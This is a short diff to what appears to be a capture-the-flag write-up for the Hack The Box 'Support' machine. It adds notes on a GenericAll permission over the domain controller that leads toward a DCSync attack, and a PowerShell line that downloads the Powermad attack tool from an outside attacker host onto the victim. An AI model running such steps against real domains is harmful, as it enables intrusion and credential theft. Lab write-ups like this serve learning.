@@ -1339,8 +1339,13 @@ INFO: Querying computer: dc.support.htb
 INFO: Done in 00M 07S
 ```
 
+`support` is member of the shared support accounts, which has GenericAll ACL (?) over the domain controller (explain more in depth how this could lead to a DSYnc):
 
+![](./screens/1.png)
 
+## Exploitation
+
+(here i just followed the steps explained in bloodhound)
 ```
  (New-Object Net.WebClient).DownloadFile('http://10.10.14.254:8000/Powermad.ps1','C:\Users\support\Documents\Powermad.ps1')
 ```
